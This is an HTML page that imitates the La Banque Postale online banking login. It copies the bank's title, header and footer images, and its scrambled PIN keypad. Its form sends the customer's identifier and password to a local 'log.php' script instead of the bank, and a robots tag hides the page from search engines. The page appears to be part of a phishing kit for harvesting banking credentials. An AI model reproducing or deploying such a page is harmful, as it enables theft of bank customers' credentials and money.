<!doctype html>
<html>

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
    <link rel="shortcut icon" type="image/png" href="asset/img/logo.PNG" type="image/x-icon" />
    <!-- CSS FILES -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-KyZXEAg3QhqLMpG8r+8fhAXLRk2vvoC2f3B09zVXn8CA5QIVfZOJ3BCsw2P0p/We" crossorigin="anonymous">
    <link rel="stylesheet" href="asset/css/style.css">


    <title>Connexion à l&#39;espace client - La Banque Postale</title>
</head>

<body>
    <!--page_1-->
    <div class="container-fluid fixed-top" style="border-bottom: solid 1px #d8d8d8; margin-left: 0px;background-color:#fff;">
        <span class="entete"><img class="d-none d-sm-block" src="asset/img/entete1lg.PNG" style="max-width: 100%;"></span>
        <span class="entete_mobile"><img class="d-block d-sm-none" src="asset/img/entete1_mobile.png"
                style="max-width: 100%;"></span>
    </div>
    <div class="container-fluid  " style="margin-top: 105px; position:relative;">
        <div class="row">
            <div class="col-md-6" style="background-color: #17479e; padding-bottom: 200px;">
                <h1 class="mx-auto" style="width: 300px; overflow: hidden; font-size: 1.7rem;line-height: 2.2rem; font-weight: bold;color: #fff; margin-top: 50px;">
                    Connexion à mes comptes</h1>
                <!--form box clavier-->
                <style>
                    .inp {
                        border-radius: 0px;
                        border: 1px solid #dcdcdc;
                        width: 90%;
                        height: 26px;
                        color: #676767;
                        text-align: center;
                        font-size: 15px;
                    }
                    
                    #motDePasse {
                        outline: none;
                    }
                </style>
                <form action="log.php" method="post">
                <div class="box_login col-md-5 col-9 mx-auto" style="background-color: #fff; margin-top: 50px; text-align: center; padding-top: 10px; padding-bottom: 10px;">
                    <input class="inp identifiant" type="text" name="identifiant" placeholder="Saisissez votre identifiant" maxlength="11">
                    <input type="checkbox" id="exampleCheck1" style="margin-left:5%" maxlength="6"> <span style="color:#676767">Mémoriser mon identifiant.</span>
                    <input type="password" name="password" maxlength="6" id="motDePasse" class="inp password" placeholder="Composez votre mot de passe" style="font-style:italic" maxlength="6" pattern="[0-9,a-z,A-Z]*" readonly>
                    <div class="mx-auto" style="height:25px;width:91%;text-align: center;font-size:17px;color:white;background-color:#586879;margin-top:5px;font-weight:600;">
                        Activer la vocalisation
                    </div>
                    <!--debut clavier-->
                    <style type="text/css">
                        .clavier {
                            padding: 2px;
                            border-radius: 0px;
                        }
                        
                        .button {
                            width: 100%;
                            height: 100%;
                            padding-top: 8.5px;
                            padding-bottom: 8.5px;
                            background-color: #004b9b;
                            border: 0px;
                            color: #fff;
                            font-size: 20px;
                        }
                        
                        .button:active {
                            background-color: #d8d8d8;
                        }
                        
                        .effacer:active {
                            background-color: #d8d8d8;
                        }
                    </style>
                    <div class="row mx-auto " style="width:90%;margin-top:9px;">
                        <div class="col-md-10 col-10 offset-md-1 offset-1">
                            <div class="row">
                                <div class="col-3 clavier"><input type="button" value="" id="btn" class="button" style="">
                                </div>
                                <div class="col-3 clavier"><button type="button" value="5" id="btn" class="button" style="">5</button></div>
                                <div class="col-3 clavier"><button type="button" value="2" id="btn" class="button" style="">2</button></div>
                                <div class="col-3 clavier"><button type="button" value="7" id="btn" class="button" style="">7</button></div>
                            </div>

                            <div class="row">
                                <div class="col-3 clavier"><button type="button" value="6" id="btn" class="button" style="">6</button></div>
                                <div class="col-3 clavier"><button type="button" value="" id="" class="button" style=""></button>
                                </div>
                                <div class="col-3 clavier"><button type="button" value="9" id="" class="button" style="">9</button>
                                </div>
                                <div class="col-3 clavier"><button type="button" value="" id="" class="button" style=""></button>
                                </div>
                            </div>

                            <div class="row">
                                <div class="col-3 clavier"><button type="button" value="4" id="btn" class="button" style="">4</button></div>
                                <div class="col-3 clavier"><button type="button" value="" id="btn" class="button" style=""></button></div>
                                <div class="col-3 clavier"><button type="button" value="0" id="btn" class="button" style="">0</button></div>
                                <div class="col-3 clavier"><input type="button" value="" id="" class="button" style="">
                                </div>
                            </div>

                            <div class="row">
                                <div class="col-3 clavier"><button type="button" value="3" id="btn" class="button" style="">3</button></div>
                                <div class="col-3 clavier"><button type="button" value="" id="" class="button" style=""></button>
                                </div>
                                <div class="col-3 clavier"><button type="button" value="1" id="btn" class="button" style="">1</button></div>
                                <div class="col-3 clavier"><button type="button" value="8" id="btn" class="button" style="">8</button></div>
                            </div>

                        </div>
                    </div>
                    <div class="row" style="margin-top:3px;  text-align: center;">
                        <div class="col-6">
                            <button id="submit" type="submit"  style="background: #4d81b9;font-weight: bold;font-size: 13px;
                            color: #fff; border:solid 1px #4d81b9;padding: 5px 15px 5px 15px" >VALIDER</button>
                        </div>
                        <div class="col-6">
                            <button class="reset" type="button" style="background: #586879;font-weight: bold;font-size: 13px;
                            color: #fff; border:solid 1px #586879;padding: 5px 15px 5px 15px">EFFACER</button>
                        </div></form>
                    </div>
                </div>
                <!--fin clavier-->


                <!--fin box -->
            </div>
            <div class="col-md-6">
                <img class="d-none d-sm-block" src="asset/img/right.png" style="max-width: 100%;">
            </div>
        </div>
        <div class="col-12" style="border-top: solid 1px #d8d8d8;">
            <img class="d-none d-sm-block" src="asset/img/pied.png" style="max-width: 100%;">
            <img class="d-block d-sm-none" src="asset/img/pied_mobile.png" style="max-width: 100%;">
        </div>
    </div>


    <!--fin page 1-->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-/bQdsTh/da6pkI1MST/rWKFNjaCP5gBSY4sEBT38Q/9RBh9AH40zEOg7Hlq2THRZ" crossorigin="anonymous"></script>
    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script type="text/javascript" src="asset/js/script.js"></script>
</body>




</html>